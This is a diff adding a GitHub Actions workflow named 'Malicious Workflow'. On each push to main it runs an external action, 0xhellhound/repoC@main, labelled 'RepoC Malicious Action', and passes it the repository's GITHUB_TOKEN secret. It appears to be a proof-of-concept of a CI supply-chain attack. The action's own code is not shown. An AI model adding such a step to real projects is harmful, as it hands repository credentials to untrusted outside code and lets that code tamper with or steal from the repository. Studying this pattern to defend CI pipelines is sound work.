@@ -1,0 +1,18 @@
+name: Malicious Workflow
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout RepoB
+        uses: actions/checkout@v3
+
+      - name: Use RepoC Malicious Action
+        uses: 0xhellhound/repoC@main
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
